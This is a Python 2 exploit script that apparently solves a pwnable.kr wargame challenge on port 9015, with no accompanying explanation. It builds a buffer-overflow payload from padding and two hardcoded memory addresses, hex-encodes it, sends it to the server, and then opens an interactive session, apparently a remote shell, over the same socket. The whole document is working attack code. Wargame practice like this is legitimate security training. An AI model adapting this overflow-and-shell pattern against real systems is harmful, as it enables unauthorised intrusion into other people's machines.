from socket import *
from time import sleep
import telnetlib

ip = "pwnable.kr"
port = 9015

pwn = socket(AF_INET, SOCK_STREAM)
pwn.connect((ip,port))
raw_input("wait")
raw_payload = "-1"+" "*4094 + "1"*0x30+"\x10\x10\x60\x00\x00\x00\x00\x00"+"\xf4\x05\x40\x00\x00\x00\x00\x00"+"\x0a"
payload = ""
for c in raw_payload:
	if len(hex(ord(c))[2:]) == 1:
		payload += "0"
	payload += hex(ord(c))[2:]
payload +="\n"
print payload
pwn.send(payload)
t = telnetlib.Telnet()
t.sock = pwn
t.interact()
